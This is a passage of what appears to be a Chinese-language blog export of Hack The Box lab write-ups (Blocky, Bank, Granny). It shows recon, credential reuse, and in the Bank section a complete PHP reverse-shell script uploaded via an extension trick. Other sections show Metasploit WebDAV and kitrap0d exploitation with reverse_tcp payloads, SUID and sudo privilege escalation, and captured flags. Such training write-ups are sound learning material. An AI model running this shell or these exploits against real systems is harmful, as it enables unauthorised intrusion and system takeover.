Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.10.37/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) | - http://10.10.10.37/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; | - http://10.10.10.37/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/ | Last Updated: 2022-01-25T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.9 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: &#39;Version: 1.3&#39; [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:20 &lt;=====================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:20 [i] No Config Backups Found. [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Mon Mar 28 23:21:31 2022 [+] Requests Done: 139 [+] Cached Requests: 37 [+] Data Sent: 34.403 KB [+] Data Received: 19.875 KB [+] Memory used: 224.391 MB [+] Elapsed time: 00:00:23 没看到什么特别明显的可用的漏洞，去 fuzz 一下目录看看 Fuzz┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.10.37/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.37/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ wp-includes [Status: 301, Size: 316, Words: 20, Lines: 10] wp-content [Status: 301, Size: 315, Words: 20, Lines: 10] plugins [Status: 301, Size: 312, Words: 20, Lines: 10] wp-admin [Status: 301, Size: 313, Words: 20, Lines: 10] javascript [Status: 301, Size: 315, Words: 20, Lines: 10] wiki [Status: 301, Size: 309, Words: 20, Lines: 10] phpmyadmin [Status: 301, Size: 315, Words: 20, Lines: 10] server-status [Status: 403, Size: 299, Words: 22, Lines: 12] [Status: 200, Size: 52256, Words: 3306, Lines: 314] :: Progress: [20116/20116] :: Job [1/1] :: 70 req/sec :: Duration: [0:12:10] :: Errors: 6 :: 有一个 phpmyadmin 目录，去尝试一下 使用默认口令登录失败 漏洞利用漏洞发现然后看到有一个 plugins 目录，去看看插件 这里有一个 BlockyCore.jar 下载下来看看 ┌──(root💀kali)-[~/…/HTB/Easy/Blocky/BlockyCore] └─# ls BlockyCore.jar ┌──(root💀kali)-[~/…/HTB/Easy/Blocky/BlockyCore] └─# unzip BlockyCore.jar Archive: BlockyCore.jar inflating: META-INF/MANIFEST.MF inflating: com/myfirstplugin/BlockyCore.class ┌──(root💀kali)-[~/…/HTB/Easy/Blocky/BlockyCore] └─# ls BlockyCore.jar com META-INF ┌──(root💀kali)-[~/…/HTB/Easy/Blocky/BlockyCore] └─# cd com ┌──(root💀kali)-[~/…/Easy/Blocky/BlockyCore/com] └─# ls -la 总用量 12 drwxr-xr-x 3 root root 4096 3月 29 00:25 . drwxr-xr-x 4 root root 4096 3月 29 00:25 .. drwxr-xr-x 2 root root 4096 3月 29 00:25 myfirstplugin ┌──(root💀kali)-[~/…/Easy/Blocky/BlockyCore/com] └─# cd myfirstplugin ┌──(root💀kali)-[~/…/Blocky/BlockyCore/com/myfirstplugin] └─# ls -la 总用量 12 drwxr-xr-x 2 root root 4096 3月 29 00:25 . drwxr-xr-x 3 root root 4096 3月 29 00:25 .. -rw-r--r-- 1 root root 939 7月 2 2017 BlockyCore.class 解压出来了，去使用 java 的反编译器 jd-gui 查看一下 apt install jd-gui 安装 jd-gui package com.myfirstplugin; public class BlockyCore { public String sqlHost = &quot;localhost&quot;; public String sqlUser = &quot;root&quot;; public String sqlPass = &quot;8YsqfCTnvxAUeduzjNSXe22&quot;; public void onServerStart() {} public void onServerStop() {} public void onPlayerJoin() { sendMessage(&quot;TODO get username&quot;, &quot;Welcome to the BlockyCraft!!!!!!!&quot;); } public void sendMessage(String username, String message) {} } 使用 jd-gui 打开 BlockyCore.class 后，我们可以看到有一个 sql 的账号和密码 正好我们有 phpmyadmin 去登陆一下 登录成功 既然这个账号可以登录 sql 数据库，那证明肯定是一个系统账户，那我们是否可用这个系统账户进行登录 ssh 呢？去尝试一下 ┌──(root💀kali)-[~/Desktop] └─# ssh root@10.10.10.37 The authenticity of host &#39;10.10.10.37 (10.10.10.37)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.37&#39; (ECDSA) to the list of known hosts. root@10.10.10.37&#39;s password: Permission denied, please try again. root@10.10.10.37&#39;s password: Permission denied, please try again. root@10.10.10.37&#39;s password: 登录失败了，那是否是其他账号的呢？我们目前也没有其他账号，去获取一下 账号获取 首先可以看到唯一一篇文章的发布人是 NOTCH（Minecraft 这款游戏的创始人） 那他很可能就是一个账号，同时我们去数据库内也看一下 在数据库内也可以看到，只有 NOTCH 这一个账号，我想应该就是了，去尝试一下吧 ┌──(root💀kali)-[~/Desktop] └─# ssh notch@10.10.10.37 130 ⨯ notch@10.10.10.37&#39;s password: Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 7 packages can be updated. 7 updates are security updates. Last login: Sun Dec 24 09:34:35 2017 notch@Blocky:~$ whoami&amp;&amp;id notch uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) 登录成功 notch@Blocky:~$ cat user.txt 59fee0977fb60b8a0bc6e41e751f3cd5 成功获得 user 权限的 flag 文件 权限提升notch@Blocky:~$ sudo -l [sudo] password for notch: Matching Defaults entries for notch on Blocky: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User notch may run the following commands on Blocky: (ALL : ALL) ALL 查看一下 sudo -l，我们的 NOTCH 账户拥有所有权限，那直接提权吧 notch@Blocky:~$ sudo su root@Blocky:/home/notch# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功提权到 root 权限 root@Blocky:/home/notch# cat /root/root.txt 0a9694a5b4d272c694679f7860f1cd5f 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Bank - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Bank","date":"2022-03-30T11:38:36.000Z","updated":"2023-06-13T03:40:27.000Z","comments":true,"path":"2022/03/30/Hackthebox/Easy/Hackthebox-Bank/","link":"","permalink":"http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/","excerpt":"","text":"Hackthebox - Bank靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Bank] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.29 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 01:51 EDT Nmap scan report for 10.10.10.29 Host is up (0.53s latency). Not shown: 63750 filtered ports, 1782 closed ports PORT STATE SERVICE VERSION 22/tcp open tcpwrapped | ssh-hostkey: | 1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA) | 2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA) | 256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA) |_ 256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519) 53/tcp open tcpwrapped | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu 80/tcp open tcpwrapped |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=3/28%OT=80%CT=7%CU=30511%PV=Y%DS=2%DC=T%G=Y%TM=62414DA OS:A%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=105%GCD=1%ISR=107%TI=Z%II=I%TS=8 OS:)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(O1=M54BST11NW7%O2=M54B OS:ST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1 OS:=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%TG=40%W=7210% OS:O=M54BNNSNW7%CC=Y%Q=)ECN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R= OS:Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=% OS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40% OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T OS:7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A OS:=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops TRACEROUTE (using port 143/tcp) HOP RTT ADDRESS 1 991.53 ms 10.10.16.1 2 233.51 ms 10.10.10.29 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 190.30 seconds Http 直接访问 ip 地址，会进入 apache 的默认页面，同时我们看到 53 端口打开着，很典型的 DNS 服务器，添加一个解析 echo 10.10.10.29 bank.htb 然后去访问一下 这就有页面了，去 fuzz 一下目录 Fuzz┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://bank.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://bank.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ uploads [Status: 301, Size: 305, Words: 20, Lines: 10] assets [Status: 301, Size: 304, Words: 20, Lines: 10] inc [Status: 301, Size: 301, Words: 20, Lines: 10] balance-transfer [Status: 301, Size: 314, Words: 20, Lines: 10] 前三个都没东西，咱们去看看第四个 balance-transfer 有很多的 .acc 结尾的文件，去看一个 这看起来像是存储的用户数据，但是都是加密的，我尝试了一下也无法解密出来，多找找看 import requests import re response = requests.get(&quot;http://bank.htb/balance-transfer/&quot;) html = response.text urls = re.findall(&#39;&lt;a href=&quot;(.*?acc)&quot;&gt;.*?acc&lt;/a&gt;&#39;, html) x = 1 y = len(urls) - 1 for url in urls: url = &#39;http://bank.htb/balance-transfer/&#39; + url name = url.split(&#39;/&#39;)[-1] response = requests.get(url) with open(name, &quot;wb&quot;) as f: f.write(response.content) print(&#39;【%s】 下载完毕 当前完成任务：%s 次 还剩任务 %s 次&#39; % (url, x, y)) x += 1 y -= 1 由于数量有点多，所以我写了个简单的爬虫来自动下载文件 一共 999 个用户，下载下来看看有没有没有加密的漏网之鱼 ┌──(root💀kali)-[~/…/HTB/Easy/Bank/Spider] └─# grep -r &#39;bank.htb&#39; ./ ./68576f20e9732f1b2edc4df5b8533230.acc:Email: chris@bank.htb 爬虫爬完了，搜索一下有没有 bank.htb 邮箱的内容，还真搜到了一个 ┌──(root💀kali)-[~/…/HTB/Easy/Bank/Spider] └─# cat 68576f20e9732f1b2edc4df5b8533230.acc --ERR ENCRYPT FAILED +=================+ | HTB Bank Report | +=================+ ===UserAccount=== Full Name: Christos Christopoulos Email: chris@bank.htb Password: !##HTBB4nkP4ssw0rd!## CreditCards: 5 Transactions: 39 Balance: 8842803 . ===UserAccount=== 查看一下内容，成功拿到一个可以用的账号密码 去登录一下后台看看 成功进入后台 主页上没什么功能点，就一个支持，然后在支持里面有一个文件上传功能，我尝试了一下直接上传 phpwebshell，上传失败。我们去看看网页源码 在 95 行发现这么一句 将会把 .htb 格式的文件以 .php 格式来运行，OK，思路有了 漏洞利用&lt;?php set_time_limit (0); $VERSION = &quot;1.0&quot;; $ip = &#39;10.10.16.4&#39;; // CHANGE THIS $port = 4444; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = &#39;uname -a; w; id; /bin/bash -i&#39;; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists(&#39;pcntl_fork&#39;)) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(&quot;ERROR: Can&#39;t fork&quot;); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(&quot;Error: Can&#39;t setsid()&quot;); exit(1); } $daemon = 1; } else { printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;); } // Change to a safe directory chdir(&quot;/&quot;); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(&quot;$errstr ($errno)&quot;); exit(1); } // Spawn shell process $descriptorspec = array( 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), // stdin is a pipe that the child will read from 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), // stdout is a pipe that the child will write to 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(&quot;ERROR: Can&#39;t spawn shell&quot;); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(&quot;Successfully opened reverse shell to $ip:$port&quot;); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(&quot;ERROR: Shell connection terminated&quot;); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(&quot;ERROR: Shell process terminated&quot;); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process&#39;s STDIN if (in_array($sock, $read_a)) { if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); } // If we can read from the process&#39;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); } // If we can read from the process&#39;s STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we&#39;ve daemonised ourself // (I can&#39;t figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print &quot;$string\\n&quot;; } } ?&gt; 将我们的 phpshell 的后缀更改为 .htb 然后去上传 然后使用 nc 监听一个端口 nc -nvlp 4444 传上去以后，点一下附件 ┌──(root💀kali)-[~/…/HTB/Easy/Bank/Spider] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.29] 37458 Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux 05:08:13 up 20:18, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1072): Inappropriate ioctl for device bash: no job control in this shell www-data@bank:/$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功拿到一个 shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; Ctrl+Z 返回 stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 修复一下 shell 权限提升find / -user root -perm -4000 -print 2&gt;/dev/null 搜索一下我们可以用来提升权限的 SUID 文件 www-data@bank:/$ find / -user root -perm -4000 -print 2&gt;/dev/null /var/htb/bin/emergency /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/bin/chsh /usr/bin/passwd /usr/bin/chfn /usr/bin/pkexec /usr/bin/newgrp /usr/bin/traceroute6.iputils /usr/bin/gpasswd /usr/bin/sudo /usr/bin/mtr /usr/sbin/pppd /bin/ping /bin/ping6 /bin/su /bin/fusermount /bin/mount /bin/umount 第一个文件一看就不简单，去运行一下 www-data@bank:/$ /var/htb/bin/emergency # ls bin boot dev etc home initrd.img initrd.img.old lib lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old # whoami root 直接就 root 了？我不是很理解原理 # cat /home/chris/user.txt 20575ef51ddd60d74b616251bc305319 拿到了 user 权限的 flag 文件 # cat /root/root.txt 9e6410fc2696f73f668c5dde1f5d0d99 拿到了 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Granny - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Granny","date":"2022-03-29T11:38:36.000Z","updated":"2023-06-13T03:44:43.000Z","comments":true,"path":"2022/03/29/Hackthebox/Easy/Hackthebox-Granny/","link":"","permalink":"http://www.lucifiel.com/2022/03/29/Hackthebox/Easy/Hackthebox-Granny/","excerpt":"","text":"Hackthebox - Granny靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Granny] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.15 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 00:33 EDT Nmap scan report for 10.10.10.15 Host is up (0.47s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown |_ Server Date: Mon, 28 Mar 2022 04:34:35 GMT Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%) OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4 Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 598.17 ms 10.10.16.1 2 598.29 ms 10.10.10.15 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.49 seconds Http 这台很眼熟啊，和 Grandpa 似乎架构一样，去尝试一下直接打试试 Metasploitmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; show options Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl): Name Current Setting Required Description ---- --------------- -------- ----------- MAXPATHLENGTH 60 yes End of physical path brute force MINPATHLENGTH 3 yes Start of physical path brute force Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.15 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path of IIS 6 web application VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Microsoft Windows Server 2003 R2 SP2 x86 设置好相关的配置，启动 msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:4444 [*] Trying path length 3 to 60 ... [*] Sending stage (175174 bytes) to 10.10.10.15 [*] Meterpreter session 1 opened (10.10.16.4:4444 -&gt; 10.10.10.15:1030) at 2022-03-28 00:39:57 -0400 meterpreter &gt; getuid [-] stdapi_sys_config_getuid: Operation failed: Access is denied. 似乎连突破点都一样，有点离谱 meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System 272 4 smss.exe 320 272 csrss.exe 344 272 winlogon.exe 392 344 services.exe 404 344 lsass.exe 560 1064 cidaemon.exe 584 392 svchost.exe 672 392 svchost.exe 732 392 svchost.exe 772 392 svchost.exe 788 392 svchost.exe 888 1064 cidaemon.exe 924 392 spoolsv.exe 952 392 msdtc.exe 960 1064 cidaemon.exe 1064 392 cisvc.exe 1112 392 svchost.exe 1168 392 inetinfo.exe 1204 392 svchost.exe 1312 392 VGAuthService.exe 1380 392 vmtoolsd.exe 1488 392 svchost.exe 1588 392 svchost.exe 1760 392 dllhost.exe 1856 392 alg.exe 1876 584 wmiprvse.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe 2252 1488 w3wp.exe x86 0 NT AUTHORITY\\NETWORK SERVICE c:\\windows\\system32\\inetsrv\\w3wp.exe 2392 584 davcdata.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe 2552 584 wmiprvse.exe 3792 2252 rundll32.exe x86 0 C:\\WINDOWS\\system32\\rundll32.exe meterpreter &gt; migrate 1876 [*] Migrating from 3792 to 1876... [*] Migration completed successfully. meterpreter &gt; getuid Server username: NT AUTHORITY\\NETWORK SERVICE 跟 Grandpa 一样的漏洞情况，做一个进程迁移就可以了 现在去提权吧 权限提升msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options Module options (exploit/windows/local/ms10_015_kitrap0d): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 1 yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 5555 yes The listen port Exploit target: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86) 设置好 session，去执行 msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:5555 [*] Launching notepad to host the exploit... [+] Process 2088 launched. [*] Reflectively injecting the exploit DLL into 2088... [*] Injecting exploit into 2088 ... [*] Exploit injected. Injecting payload into 2088... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 10.10.10.15 [*] Meterpreter session 2 opened (10.10.16.4:5555 -&gt; 10.10.10.15:1031) at 2022-03-28 00:45:56 -0400 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM 成功提权到 root 权限 meterpreter &gt; search -f user.txt Found 1 result... c:\\Documents and Settings\\Lakis\\Desktop\\user.txt (32 bytes) meterpreter &gt; search -f root.txt Found 1 result... c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes) meterpreter &gt; cat &#39;c:\\Documents and Settings\\Lakis\\Desktop\\user.txt&#39; 700c5dc163014e22b3e408f8703f67d1 meterpreter &gt; cat &#39;c:\\Documents and Settings\\Administrator\\Desktop\\root.txt&#39; aa4beed1c0584445ab463a6747bd06e9 meterpreter &gt; 成功拿到 user 和 root 权限的 flag 文件 这台的情况和 Grandpa 一模一样，没什么好说的","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Grandpa - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Grandpa","date":"2022-03-28T11:38:36.000Z","updated":"2023-06-13T03:44:33.000Z","comments":true,"path":"2022/03/28/Hackthebox/Easy/Hackthebox-Grandpa/","link":"","permalink":"http://www.lucifiel.com/2022/03/28/Hackthebox/Easy/Hackthebox-Grandpa/","excerpt":"","text":"Hackthebox - Grandpa靶场信息 靶场类型 